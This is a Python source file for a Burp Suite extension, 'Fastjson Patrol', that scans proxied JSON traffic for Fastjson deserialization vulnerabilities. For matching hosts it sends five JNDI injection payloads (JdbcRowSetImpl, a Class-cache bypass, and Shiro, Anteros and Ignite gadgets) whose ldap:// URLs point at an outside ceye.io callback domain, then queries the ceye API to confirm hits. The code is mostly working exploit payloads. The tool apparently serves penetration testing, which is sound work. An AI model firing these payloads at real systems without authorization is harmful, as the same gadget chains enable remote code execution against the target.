#coding=utf-8

import re
import requests
from hashlib import md5
import random
from burp import IBurpExtender
from burp import IHttpListener

def seed():
    seed = md5()
    seed.update(str(random.randint(1, 100000)))
    return seed.hexdigest()[:12]

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        banner = "______        _   _                  ______     _             _ \n|  ___|      | | (_)                 | ___ \   | |           | |\n| |_ __ _ ___| |_ _ ___  ___  _ __   | |_/ /_ _| |_ _ __ ___ | |\n|  _/ _` / __| __| / __|/ _ \| '_ \  |  __/ _` | __| '__/ _ \| |\n| || (_| \__ \ |_| \__ \ (_) | | | | | | | (_| | |_| | | (_) | |\n\_| \__,_|___/\__| |___/\___/|_| |_| \_|  \__,_|\__|_|  \___/|_|\n                _/ |                                            \n               |__/                        by automne"
        print(banner)
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        callbacks.setExtensionName('Fastjson Patrol')
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        response_is_json = False
        domain_is_white = False
        uri_not_detect = False
        if toolFlag == self.callbacks.TOOL_PROXY or toolFlag == self.callbacks.TOOL_REPEATER:
            if not messageIsRequest:
                resquest = messageInfo.getRequest()
                analyzedRequest = self.helpers.analyzeRequest(resquest)
                request_header = analyzedRequest.getHeaders()
                request_method = analyzedRequest.getMethod()				
                request_bodys = resquest[analyzedRequest.getBodyOffset():].tostring()
                request_host, request_uri = self.get_request_host(request_header)
                request_contentType = analyzedRequest.getContentType()			

                response = messageInfo.getResponse()
                analyzedResponse = self.helpers.analyzeResponse(response)
                response_headers = analyzedResponse.getHeaders()
                response_bodys = response[analyzedResponse.getBodyOffset():].tostring()
                response_statusCode = analyzedResponse.getStatusCode()
                expression = r'.*(application/json).*'
                for rpheader in response_headers:
                    if rpheader.startswith("Content-Type:") and re.match(expression, rpheader):
                        response_is_json = True

                httpService = messageInfo.getHttpService()
                port = httpService.getPort()
                host = httpService.getHost()
				
                whitedomains = ['.baidu.com','.163.com']
                blackuris = ['/abc']				

                if response_is_json or request_contentType == 4:
                    random24 = seed()
                    random47 = seed()
                    random68 = seed()

                    Payload24 = '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://'+ str(random24) + '.xxxx.ceye.io/abc","autoCommit":true}}'
                    Payload47 = '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://'+ str(random47) + '.xxxx.ceye.io/abc","autoCommit":true}}'
                    Body24 = self.helpers.stringToBytes(Payload24)
                    Body47 = self.helpers.stringToBytes(Payload47)

                    Payload68_1 = '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://'+ str(random68) + '.xxxx.ceye.io/abc"}'
                    Payload68_2 = '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://'+ str(random68) + '.xxxx.ceye.io/abc"}'
                    Payload68_3 = '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://'+ str(random68) + '.xxxx.ceye.io/abc"}'
                    Body68_1 = self.helpers.stringToBytes(Payload68_1)
                    Body68_2 = self.helpers.stringToBytes(Payload68_2)
                    Body68_3 = self.helpers.stringToBytes(Payload68_3)
                   
                    if request_method == 'GET':
                        #print 'Got GET-JSON Request ---> Change To POST Request'
                        newRequest = self.helpers.toggleRequestMethod(resquest)
                        newAnalyzedRequest = self.helpers.analyzeRequest(newRequest)
                        newRequestheader = newAnalyzedRequest.getHeaders()
                        newRequestheader = '$$'.join(newRequestheader).replace("application/x-www-form-urlencoded","application/json")
                        newRequestheader = newRequestheader.encode('utf-8').split('$$')						                      
                        Request24 = self.helpers.buildHttpMessage(newRequestheader, Body24)
                        Request47 = self.helpers.buildHttpMessage(newRequestheader, Body47)
                        Request68_1 = self.helpers.buildHttpMessage(newRequestheader,Body68_1)												
                        Request68_2 = self.helpers.buildHttpMessage(newRequestheader,Body68_2)												
                        Request68_3 = self.helpers.buildHttpMessage(newRequestheader,Body68_3)												
                    else:
                        Request24 = self.helpers.buildHttpMessage(request_header, Body24)
                        Request47 = self.helpers.buildHttpMessage(request_header, Body47)
                        Request68_1 = self.helpers.buildHttpMessage(request_header, Body68_1)
                        Request68_2 = self.helpers.buildHttpMessage(request_header, Body68_2)
                        Request68_3 = self.helpers.buildHttpMessage(request_header, Body68_3)
                    ishttps = False
                    expression = r'.*(443).*'
                    if re.match(expression, str(port)):
                        ishttps = True

                    for white in whitedomains:
                        if white in request_host:
                            domain_is_white = True
                    for black in blackuris:
                        if black in request_uri:
                            uri_not_detect = True						
                    if re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]{1,5})*$",request_host) or domain_is_white:
                        print "request_host:"+request_host
                        print "request_uri:"+request_uri
                        if uri_not_detect:
						    pass
                        else:
                            rep24 = self.callbacks.makeHttpRequest(host, port, ishttps, Request24)
                            rep47 = self.callbacks.makeHttpRequest(host, port, ishttps, Request47)
                            rep68_1 = self.callbacks.makeHttpRequest(host, port, ishttps, Request68_1)
                            rep68_2 = self.callbacks.makeHttpRequest(host, port, ishttps, Request68_2)
                            rep68_3 = self.callbacks.makeHttpRequest(host, port, ishttps, Request68_3)
                    r = requests.get("http://api.ceye.io/v1/records?token=your_token_string&type=dns&filter=" + str(random24))
                    r2 = requests.get("http://api.ceye.io/v1/records?token=your_token_string&type=dns&filter=" + str(random47))
                    r3 = requests.get("http://api.ceye.io/v1/records?token=your_token_string&type=dns&filter=" + str(random68))
                    if ((random24 in r.content) and (r.status_code == 200)):
                        messageInfo.setHighlight('red')
                        print "[!] Target Locked  Request Fire"
                        print "\t[-] host:" + str(host) + " port:" + str(port) 
                        print "\t[-] fastjson<=1.2.24 detected!"
                        print "\t[-] playload:" + str(Payload24) + "\r\n"
                    if ((random47 in r2.content) and (r.status_code == 200)):                        
                        messageInfo.setHighlight('red')
                        print "[!] Target Locked  Request Fire"
                        print "\t[-] host:" + str(host) + " port:" + str(port) 
                        print "\t[-] fastjson<=1.2.47 detected!"
                        print "\t[-] playload:" + str(Payload47) + "\r\n"
                    if ((random68 in r3.content) and (r.status_code == 200)):                        
                        messageInfo.setHighlight('red')
                        print "[!] Target Locked  Request Fire"
                        print "\t[-] host:" + str(host) + " port:" + str(port) 
                        print "\t[-] fastjson<=1.2.68 detected!"
                        print "\t[-] playload: Please Confirm Manually \r\n"

    def get_request_host(self, reqHeaders):
        uri = reqHeaders[0].split(' ')[1]
        reqHeaders_str = ','.join(reqHeaders)
        host = re.search(r'Host: .*,',reqHeaders_str,re.M|re.I).group()		
        host = host.split(',')[0].split(': ')[1]
        return host, uri
